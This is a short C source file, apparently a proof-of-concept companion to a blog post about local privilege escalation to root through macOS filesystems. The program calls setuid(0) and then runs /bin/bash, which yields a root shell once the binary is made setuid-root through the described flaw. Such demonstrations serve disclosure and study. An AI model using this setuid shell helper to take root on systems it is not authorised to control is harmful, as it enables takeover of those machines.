/** @file Main.c
 * Just an application of https://www.alter-solutions.fr/blog/local-privilege-escalating-my-way-to-root-throught-apple-macos-filesystems
 */
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int main(int argc, const char *argv[])
{
    int Result;
    
    printf("Switching to root...\n");
    Result = setuid(0);
    if (Result != 0)
    {
        printf("Failed to setuid() to root (%s).\n", strerror(errno));
        return -1;
    }
    
    printf("Running BASH with root permissions...\n");
    system("/bin/bash");
    
    return 0;
}
